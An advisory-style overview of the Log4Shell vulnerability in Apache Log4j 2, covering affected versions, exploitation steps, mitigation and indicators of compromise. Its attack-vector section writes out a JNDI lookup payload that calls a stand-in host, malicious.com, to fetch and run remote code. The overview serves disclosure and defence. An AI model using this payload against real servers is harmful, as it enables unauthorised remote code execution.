Log4Shell (CVE-2021-44228) Vulnerability Overview

Summary:
Log4Shell is a critical vulnerability (CVE-2021-44228) in the Apache Log4j 2 library, discovered in December 2021. It allows Remote Code Execution (RCE) via JNDI lookups when user-controlled input is logged.

Severity:
CVSS Score: 10.0 (Critical)

Attack Vector:
The vulnerability arises when a malicious payload is passed to a logging function, such as:
${jndi:ldap://malicious.com/a}
This payload triggers a lookup and executes remote code on the vulnerable server.

Impacted Systems:
- Java-based applications using Log4j versions 2.0 to 2.14.1
- Popular affected platforms: Minecraft servers, Apache Struts, ElasticSearch, Spring Boot

Exploitation:
1. Send payload in HTTP headers or user inputs.
2. Log4j performs JNDI lookup and fetches remote class file.
3. Remote code executes on server.

Mitigation:
- Upgrade to Log4j 2.16.0 or higher
- Disable JNDI lookups (`log4j2.formatMsgNoLookups=true`)
- Apply WAF rules to detect exploit strings

Indicators of Compromise:
- Outbound LDAP or RMI traffic from app servers
- Unexpected class downloads or classloader activity

Real-World Incidents:
- Cloudflare, Amazon, and Apple patched systems urgently
- Active exploitation within hours of disclosure
